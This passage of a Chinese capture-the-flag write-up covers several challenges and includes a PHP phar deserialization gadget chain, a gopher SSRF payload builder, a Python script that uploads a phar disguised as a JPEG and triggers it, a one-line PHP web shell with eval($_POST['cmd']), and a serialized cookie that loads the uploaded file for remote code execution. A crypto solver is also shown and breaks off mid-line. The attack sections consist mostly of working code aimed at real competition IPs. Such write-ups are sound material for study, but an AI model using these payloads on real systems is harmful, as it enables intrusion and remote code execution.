<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$schema</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> AdminShow();</span><br><span class="line"><span class="variable">$guest</span> = <span class="keyword">new</span> GuestShow();</span><br><span class="line"><span class="variable">$guest1</span> = <span class="keyword">new</span> GuestShow();</span><br><span class="line"><span class="variable">$upload</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$upload1</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$upload2</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$guest</span>-&gt;file = <span class="variable">$upload</span>;</span><br><span class="line"><span class="variable">$upload</span>-&gt;tmp = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str[<span class="number">0</span>] = <span class="variable">$upload1</span>;</span><br><span class="line"><span class="variable">$upload1</span>-&gt;date=<span class="string">&#x27;&#x27;</span>; <span class="comment">// 给source赋值</span></span><br><span class="line"><span class="variable">$upload1</span>-&gt;filesize = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;filesize = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;tmp = <span class="variable">$guest1</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str[<span class="number">1</span>] = <span class="variable">$upload2</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;date = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 给schema赋值</span></span><br><span class="line"><span class="variable">$guest1</span>-&gt;file = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$guest</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&#x27;test.phar&#x27;</span>,<span class="string">&#x27;f.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>然后把文件上传，并通过showfie.php进行phar://协议触发反序列化，最先我们可以先读取<code>/etc/hosts</code>发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.18.0.2	3b35825919ae</span><br><span class="line">10.10.10.5	3b35825919ae</span><br></pre></td></tr></table></figure>

<p>那么先可以利用http协议查看那个ip存在可利用信息，最终发现在<code>10.10.10.10</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//内网资源阅读器-测试机</span></span><br><span class="line"><span class="comment">//配置信息请看phpinfo.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line">    curl_close(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;10.10.10.101&#x27;</span>||<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;100.100.100.101&#x27;</span>)&#123;</span><br><span class="line">    system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后利用gopher进行GET利用url file协议读取flag就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;GET /?url=file:///flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.10.10.101</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://10.10.10.10:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(filename):</span><br><span class="line">    with open(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        a = base64.b64encode(f.read())</span><br><span class="line">    c = base64.b64encode(base64.b64decode(a).replace(<span class="string">b&quot;10.10.10.5&quot;</span>, <span class="string">b&quot;10.10.10.6&quot;</span>))</span><br><span class="line">    with open(<span class="string">&#x27;e.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">        w.write(base64.b64decode(c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/upload.php&#x27;</span></span><br><span class="line">    <span class="comment"># url = &#x27;http://127.0.0.1:40012/upload.php&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;123456789&#x27;</span>&#125;</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: open(<span class="string">&#x27;f.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(url, files=files, data=data, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;test2&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def phar(payload):</span><br><span class="line">    <span class="comment"># url = &#x27;http://47.104.95.124:8080/showfile.php?f=&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=php://filter/guest/resource=phar:///var/www/html/&#x27;</span></span><br><span class="line">    <span class="comment"># url = &#x27;http://127.0.0.1:40012/showfile.php?f=php://filter/guest/resource=phar://&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(upload())</span></span><br><span class="line">    <span class="comment"># payload = &#x27;phar:///var/www/html/&#x27; + upload()</span></span><br><span class="line">    <span class="comment"># data = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;111111111&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># files = &#123;&#x27;file&#x27;: &#x27;123&#x27;&#125;</span></span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getFileByGuestShow():</span><br><span class="line">    <span class="keyword">global</span> content</span><br><span class="line">    filename = [<span class="string">&#x27;index.php&#x27;</span>, <span class="string">&#x27;showfile.php&#x27;</span>, <span class="string">&#x27;class.php&#x27;</span>, <span class="string">&#x27;upload.php&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> file in filename:</span><br><span class="line">        url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=demo/../&#x27;</span> + file</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        zz = re.compile(<span class="string">&#x27;&lt;img src=data:jpg;base64,[a-zA-Z0-9\\\+/=]&#123;1,&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> zz.findall(r.text):</span><br><span class="line">            content = zz.findall(r.text)[<span class="number">0</span>][<span class="number">25</span>:]</span><br><span class="line">            <span class="keyword">print</span>(content)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            with open(file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">                base = base64.b64decode(content)</span><br><span class="line">                <span class="keyword">print</span>(base)</span><br><span class="line">                w.write(base)</span><br><span class="line">        except:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getFileByAdminShow():</span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;111111111&#x27;</span>&#125;</span><br><span class="line">    payload = <span class="string">&#x27;../../../../etc/hosts&#x27;</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url + payload, files=files, data=data, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;test123456&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># edit(&#x27;e.jpg&#x27;)</span></span><br><span class="line">    upload()</span><br><span class="line">    <span class="comment"># getFileByGuestShow()  # 获取文件内容</span></span><br><span class="line">    phar(<span class="string">&#x27;16029c2703ba2ab39d897f966a28f95c/f.jpg&#x27;</span>)  <span class="comment"># 上传文件并执行phar</span></span><br><span class="line">    <span class="comment"># getFileByAdminShow()</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2e340a68ab1b444fbacace5443fec797.png" alt="QQ图片20220801142401"></p>
<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;easy_penetration_it_is_!_QAQ&#125;</span><br></pre></td></tr></table></figure>

<h3 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h3><h4 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h4><p>存在<code>www.zip</code>泄露</p>
<p>upload.php中存在黑名单，并且尝试上传phps等后缀的时候发现并没有被解析，但是可以上传inc文件</p>
<p>并且可以发现文件名会被放到<code>$userfile</code>数组中并将数组序列化放到cookie中，当然在一开始做题测试的时候应该也能从页面中看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeArr</span> = explode(<span class="string">&quot;/&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>]);</span><br><span class="line">        <span class="variable">$imgType</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$typeArr</span>[<span class="number">0</span>]== <span class="string">&quot;image&quot;</span> | !in_array(<span class="variable">$typeArr</span>[<span class="number">1</span>], <span class="variable">$imgType</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>];</span><br><span class="line">        <span class="variable">$filearray</span> = pathinfo(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$filearray</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;extension error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$imgname</span> = md5(time()).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;./&quot;</span>.<span class="variable">$imgname</span>)) &#123;</span><br><span class="line">            array_push(<span class="variable">$userfile</span>, <span class="variable">$imgname</span>);</span><br><span class="line">            setcookie(<span class="string">&quot;userfile&quot;</span>, serialize(<span class="variable">$userfile</span>), time() + <span class="number">3600</span>*<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$msg</span> = e(<span class="string">&quot;file: <span class="subst">&#123;$imgname&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在class.inc.php中可以发现，而它不仅可以解析php文件还可以解析inc文件</p>
<p>而这里也直接对cookie进行反序列化，没有任何过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register();</span><br><span class="line"><span class="variable">$userfile</span> = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]) ? [] : unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>那么直接上传一个inc文件，注意要将文件的Content-type修改一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b5891132765242fd9daff83805a9f76e.png" alt="image-20220801135545948"></p>
<p>获得文件名，将cookie修改成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A32%3A%2202f9bf508f93eebdd216dba17c5a99c0%22%3A0%3A%7B%7D</span><br></pre></td></tr></table></figure>

<p>刷新一下，执行成功</p>
<p><img src="https://img-blog.csdnimg.cn/dd15e841bf46482c88ec479bf68a682c.png" alt="image-20220801140011233"></p>
<p>flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3acd895a-8b80-4fd7-8cc9-2701f261d654&#125;</span><br></pre></td></tr></table></figure>

<h4 id="polydiv"><a href="#polydiv" class="headerlink" title="polydiv"></a>polydiv</h4><ul>
<li><p>题目描述</p>
<p>多项式乘法，已知<code>a(x)*b(x)+c(x)=r(x)</code>，<code>a(x),c(x),r(x)</code>求`b(x)</p>
</li>
</ul>
<p>题目与提供的代码稍有出入，服务器上跑的是可以看成在$GF(2^8)$下求<code>b(x)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sage: R.&lt;x&gt;=GF(<span class="number">8</span>)</span><br><span class="line">sage: a = x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">2</span></span><br><span class="line">....: c = x^<span class="number">6</span> + x^<span class="number">5</span> + x^<span class="number">4</span> + x^<span class="number">3</span> + x^<span class="number">2</span> + x + <span class="number">1</span></span><br><span class="line">....: r = x^<span class="number">14</span> + x^<span class="number">12</span> + x^<span class="number">10</span> + x^<span class="number">7</span> + x^<span class="number">2</span> + x + <span class="number">1</span></span><br><span class="line">sage: (r-c)/a</span><br><span class="line">x^<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>或者直接爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> poly2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;182.92.82.77&#x27;</span>, <span class="number">12469</span>)</span><br><span class="line">        self.r = <span class="number">0</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line">        self.c = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        proof = self.sh.recvuntil(<span class="string">b&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">        _<span class="built_in">hash</span> = proof[<span class="number">33</span>:<span class="number">97</span>].decode()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">                self.sh.sendline(head.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Poly2N</span>(<span class="params">self, f</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(f.replace(<span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;**&#x27;</span>).replace(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;2&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, a, c, pr</span>):</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            pa, pb, pc = [PP(<span class="built_in">bin</span>(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c]]</span><br><span class="line">            r = pa * pb + pc</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(r) == pr:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">int</span>(b)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_rac</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;r(x) = 